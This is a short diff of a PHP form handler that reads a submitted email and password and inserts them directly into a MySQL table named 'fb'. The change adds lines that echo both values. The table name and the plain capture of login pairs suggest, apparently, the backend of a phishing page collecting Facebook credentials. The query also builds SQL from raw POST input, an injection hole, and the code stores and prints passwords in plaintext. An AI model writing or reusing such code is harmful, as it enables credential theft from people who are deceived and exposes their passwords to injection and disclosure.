@@ -7,7 +7,8 @@ if(isset($_POST["submit"]))
 {
     $username= $_POST["Email"];
     $password = $_POST["password"];
-
+echo $username;
+echo $password;
 
 
         $query = mysqli_query($db, "INSERT INTO fb (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
